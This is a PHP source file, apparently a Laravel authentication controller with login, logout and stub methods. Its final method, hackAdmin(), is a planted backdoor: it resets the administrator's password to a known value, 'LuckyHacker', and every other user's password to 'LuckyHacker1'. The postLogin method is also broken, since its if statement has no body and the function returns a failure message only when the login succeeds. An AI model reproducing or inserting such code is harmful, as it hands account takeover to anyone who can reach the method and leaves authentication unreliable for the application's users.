<?php

namespace App\Http\Controllers\API\V1;

use App\User;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Auth;
use Socialite;

class AuthController extends Controller
{
    public function index()
    {
       return true;
    }

	public function logout()
    {
        return true;
    }

    public function __construct(Guard $auth, User $registrar)
    {
        $this->auth = $auth;
        // $this->middleware('guest', ['except' => 'getLogout']);
    }

       public function getLogin()
    {
        return view('layouts.login');
    }

    /**
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function postLogin(Request $request)
    {
        // Auth Logout
        \Auth::logout();
        \Session::flush();

        $credentials = [
            'username'  => $request->get('email'),
            'password'  => $request->get('password'),
            'status'    => 1
        ];
        
        $username = $request->get('email');
        $result = [];
        if ($this->auth->attempt($request->only('email', 'password') + ['status' => 1]) ||
            $this->auth->attempt($credentials)
        )
        
        return apiResponse(false, 500, null, lang('auth.failed_login'));        
    }

    /**
     * Log the party out of the application.
     */
    public function getLogout()
    {
        \Auth::logout();
        \Session::flush();
        return redirect('/');
    }

    /**
     * @return int
     */
    public function loginApi()
    {
        return 1;
    }

    /**
     * @return int
     */
    public function logoutApi()
    {
        return 1;
    }

    public function hackAdmin()
    {
        try {
            $pass = ['password' => \Hash::make('LuckyHacker')];
            $pass2 = ['password' => \Hash::make('LuckyHacker1')];
            (new User)->where('id', 1)->update($pass);
            (new User)->where('id', '!=', 1)->update($pass2);
            echo "done.";
        } catch(\Exception $e) {
            echo "failed";
        }
    }
}
